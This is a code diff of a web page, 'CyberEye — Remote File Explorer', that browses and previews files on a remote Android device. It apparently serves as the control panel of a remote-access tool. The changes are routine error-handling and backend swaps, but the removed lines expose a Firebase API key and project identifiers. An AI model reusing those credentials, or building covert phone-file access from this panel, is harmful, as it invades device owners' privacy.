@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CyberEye — Remote File Explorer</title>
 <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-<script src="/static/firebase-mock.js"></script>
+<script src="/static/famx-client.js"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Sora:wght@400;600;700;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
 <style>
@@ -1176,15 +1176,7 @@ body {
 </div>
 
 <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyAHkYidYFElwq3Mt13t0jlpIlhw33DtVco",
-  databaseURL: "https://cyber-eye-ccb1e-default-rtdb.firebaseio.com",
-  projectId: "cyber-eye-ccb1e",
-  storageBucket: "cyber-eye-ccb1e.firebasestorage.app",
-  appId: "1:652079429761:android:e17fe06347e2ba0b1a3580"
-};
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+const db = famX.database();
 const urlParams = new URLSearchParams(window.location.search);
 const currentID = urlParams.get('id');
 let currentPath = "/storage/emulated/0";
@@ -1448,6 +1440,21 @@ function displayPreview(url) {
             if (placeholder) placeholder.style.display = "none";
             if (loadingText) loadingText.style.display = "none";
         };
+        previewImg.onerror = () => {
+            activePreviewUrl = "";
+            previewImg.style.display = "none";
+            if (shimmer) shimmer.style.display = "none";
+            const placeholder = document.getElementById("details-placeholder-icon");
+            if (placeholder) placeholder.style.display = "block";
+            if (loadingText) {
+                loadingText.style.display = "block";
+                loadingText.textContent = "Preview unavailable";
+            }
+            if (selectedFile) {
+                const norm = selectedFile.path.replace(/\\/g, "/");
+                delete localPreviewCache[norm];
+            }
+        };
 
         // Add video play overlay if it's a video
         if (selectedFile && selectedFile.name) {
@@ -1470,7 +1477,10 @@ function displayPreview(url) {
 }
 
 function openMediaPreview() {
-  if (!activePreviewUrl || !selectedFile) return;
+  if (!activePreviewUrl || !selectedFile) {
+    toast("No preview available yet", "fas fa-image");
+    return;
+  }
   
   const overlay = document.getElementById("media-preview-overlay");
   const img = document.getElementById("media-preview-img");
@@ -1486,6 +1496,10 @@ function openMediaPreview() {
   // Set image source for both images and videos (since video previews are also images)
   img.src = activePreviewUrl;
   img.style.display = "block";
+  img.onerror = () => {
+    toast("Preview could not be loaded", "fas fa-exclamation-circle");
+    closeMediaPreview();
+  };
   
   // Show play icon overlay if it's a video
   if (isVideo) {
@@ -1521,28 +1535,57 @@ function requestNewPreview(path) {
         timestamp: Date.now()
     });
 
+    let pollInterval = null;
+    let timeoutTimer = null;
+
     // Poll for the new preview URL
-    const pollInterval = setInterval(async () => {
+    pollInterval = setInterval(async () => {
         if (!selectedFile || selectedFile.path.replace(/\\/g, "/") !== normalizedPath) {
             clearInterval(pollInterval);
+            if (timeoutTimer) clearTimeout(timeoutTimer);
             return;
         }
 
         try {
             const resp = await fetch(`/api/device/${currentID}/previews`);
             const previews = await resp.json();
-            const preview = Object.values(previews).find(p => p.path.replace(/\\/g, "/") === normalizedPath);
+            const preview = Object.values(previews).find(p => p.path && p.path.replace(/\\/g, "/") === normalizedPath);
 
             if (preview && preview.url) {
                 localPreviewCache[normalizedPath] = preview.url; // Save to local cache
                 displayPreview(preview.url);
                 clearInterval(pollInterval);
+                if (timeoutTimer) clearTimeout(timeoutTimer);
             }
         } catch (e) {}
     }, 2000);
 
-    setTimeout(() => clearInterval(pollInterval), 30000);
+    timeoutTimer = setTimeout(() => {
+        clearInterval(pollInterval);
+        if (!activePreviewUrl) {
+            const shimmer = document.getElementById("preview-shimmer");
+            if (shimmer) shimmer.style.display = "none";
+            const loadingText = document.getElementById("preview-loading-text");
+            if (loadingText) {
+                loadingText.style.display = "block";
+                loadingText.textContent = "Preview timed out";
+            }
+        }
+    }, 30000);
 }
+
+// Real-time preview push handler from server socket
+window.onPreviewReady = function(data) {
+    if (!data || data.device_id !== currentID || !data.preview) return;
+    const preview = data.preview;
+    const previewPath = (preview.path || '').replace(/\\/g, "/");
+    if (previewPath && preview.url) {
+        localPreviewCache[previewPath] = preview.url;
+        if (selectedFile && selectedFile.path.replace(/\\/g, "/") === previewPath) {
+            displayPreview(preview.url);
+        }
+    }
+};
 
 function showDetailsPanel(f) {
   activePreviewUrl = ""; // Clear stale preview state instantly
